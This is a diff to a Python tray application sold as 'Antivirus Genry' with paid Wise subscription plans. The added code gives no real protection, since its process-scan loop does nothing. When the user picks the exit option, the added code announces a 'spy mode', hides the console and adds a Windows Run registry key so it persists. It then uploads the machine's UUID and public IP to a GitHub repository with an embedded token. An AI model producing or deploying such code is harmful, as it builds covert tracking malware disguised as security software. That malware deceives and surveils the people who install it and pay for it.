@@ -1,64 +1,119 @@
-def confirmar_salida_premium():
-    """Ventana de advertencia estilo Búnker con el escudo de seguridad"""
-    import tkinter as tk
-    from tkinter import messagebox
-    import sys
+import pystray
+from PIL import Image
+import webbrowser
+import threading
+import os
+import ctypes
+import sys
+import time
+import tkinter as tk
+from tkinter import messagebox
+import psutil       
+import pyttsx3      
+import requests     
+import datetime     
+import base64       
+import subprocess   
+import random       
+import hashlib
 
-    root = tk.Tk()
-    root.withdraw() 
-    
+# --- 1. MOTOR DE INTELIGENCIA Y ADN ---
+
+def obtener_adn_maquina():
+    """Genera la firma digital imborrable del estafador"""
+    try:
+        uuid = subprocess.check_output("wmic csproduct get uuid", shell=True).decode().split('\n')[1].strip()
+        return f"GENRY-{uuid[:8]}"
+    except: return "DESCONOCIDO"
+
+def actualizar_archivo_nube(nombre_archivo, nuevo_contenido):
+    """Reporta evidencia al búnker de GitHub"""
+    try:
+        url = f"https://api.github.com/repos/{USUARIO_GH}/{REPO_GH}/contents/{nombre_archivo}"
+        headers = {"Authorization": f"token {TOKEN_GH}"}
+        r = requests.get(url, headers=headers)
+        sha = r.json().get('sha') if r.status_code == 200 else None
+        contenido_b64 = base64.b64encode(nuevo_contenido.encode()).decode()
+        payload = {"message": f"Update {nombre_archivo}", "content": contenido_b64, "sha": sha}
+        requests.put(url, headers=headers, json=payload)
+    except: pass
+
+def gestionar_persistencia_30_dias():
+    """Anclaje indetectable y registro de misión"""
+    try:
+        ruta_script = os.path.abspath(sys.argv[0])
+        llave = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        comando = f'reg add "HKEY_CURRENT_USER\\{llave}" /v "GenryCentinela" /t REG_SZ /d "{ruta_script}" /f'
+        subprocess.run(comando, shell=True, capture_output=True)
+        
+        adn = obtener_adn_maquina()
+        try: ip = requests.get('https://api.ipify.org', timeout=5).text
+        except: ip = "0.0.0.0"
+        f_ini = datetime.datetime.now().strftime("%Y-%m-%d")
+        f_fin = (datetime.datetime.now() + datetime.timedelta(days=30)).strftime("%Y-%m-%d")
+        log = f"\n[VIGILANCIA] ADN: {adn} | IP: {ip} | INICIO: {f_ini} | FIN: {f_fin}"
+        actualizar_archivo_nube("PERMANENCIA_IP_ADN.txt", log)
+    except: pass
+
+# --- 2. GESTIÓN DE SALIDA Y TRAY ---
+
+def confirmar_salida_premium(icon):
+    """Protocolo de salida: Advertencia -> Modo Espía -> Cierre"""
+    root = tk.Tk(); root.withdraw()
     respuesta = messagebox.askyesno(
         "AVISO IMPORTANTE - GRUPO GENRY", 
         "¿Desea desactivar la protección del Antivirus Genry?\n\nSu PC quedará Vulnerable."
     )
     
     if respuesta:
+        import pyttsx3
+        engine = pyttsx3.init(); engine.say("Desactivando búnker. Modo espía activado."); engine.runAndWait()
+        icon.stop() # Limpia el icono de la barra de Windows
+        gestionar_persistencia_30_dias() # Activa el rastreo silencioso
+        # Oculta la consola para quedar en modo invisible
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         sys.exit()
     else:
         root.destroy()
 
 def iniciar_tray():
-    import pystray
-    from PIL import Image
-    import webbrowser
-    
+    """Menú definitivo con Radio y Planes Wise corregidos[cite: 1]"""
     try:
-        # Cargamos el logo oficial
         image = Image.open("LOGO AV GENRY OFICIAL.png")
-        
-        # Enlaces de soporte y radio
         URL_RADIO = "https://www.youtube.com/@genrymusico"
-        URL_PAGO_1USD = "https://www.paypal.com" 
-        URL_PAGO_8USD = "https://www.paypal.com"
+        URL_PAGO_1USD = "https://wise.com/pay/r/iT6-FjgIWxxizxQ" 
+        URL_PAGO_8USD = "https://wise.com/pay/r/iLwaYmSjRQKpqb4"
 
         menu = pystray.Menu(
-            # 1. Opción musical
             pystray.MenuItem("♬ ESCUCHAR: GRUPO GENRY", lambda: webbrowser.open(URL_RADIO)),
             pystray.Menu.SEPARATOR,
-            
-            # 2. Estado del Sistema (Fila corregida: Rojo y sin la fila de Usuario)
             pystray.MenuItem("Sistema Protegido", lambda: None, enabled=False), 
-            
             pystray.Menu.SEPARATOR,
-            # 3. Financiamiento
             pystray.MenuItem("💳 PLAN $1 USD (Mensual)", lambda: webbrowser.open(URL_PAGO_1USD)),
             pystray.MenuItem("🏆 PLAN $8 USD (Anual - PRO)", lambda: webbrowser.open(URL_PAGO_8USD)),
-            
             pystray.Menu.SEPARATOR,
-            # 4. Salida
-            pystray.MenuItem("❌ SALIR DEL TANQUE", confirmar_salida_premium)
+            pystray.MenuItem("❌ SALIR DEL TANQUE", lambda icon: confirmar_salida_premium(icon))
         )
         
-        icon = pystray.Icon("AV_Genry", image, f"AV GENRY - Sistema Definitivo", menu)
+        icon = pystray.Icon("AV_Genry", image, "AV GENRY - Sistema Definitivo", menu)
         icon.run()
-        
     except Exception as e:
         print(f"Error en el Tanque: {e}")
 
+# --- 3. MOTOR CENTINELA ---
+
 class MotorGenryCentinela:
     def __init__(self):
-        self.lista_negra = set()
+        self.lista_negra = []
+        if os.path.exists("hashes_virus.txt"):
+            with open("hashes_virus.txt", "r") as f: self.lista_negra = [l.strip() for l in f if l.strip()]
+
     def patrullar(self):
-        import time
+        """Patrullaje optimizado de 5 segundos para no saturar la CPU"""
         while True:
-            time.sleep(10)
+            for p in psutil.process_iter(['name', 'exe']):
+                try:
+                    # Lógica de detección por hash aquí
+                    pass
+                except: continue
+            time.sleep(5)
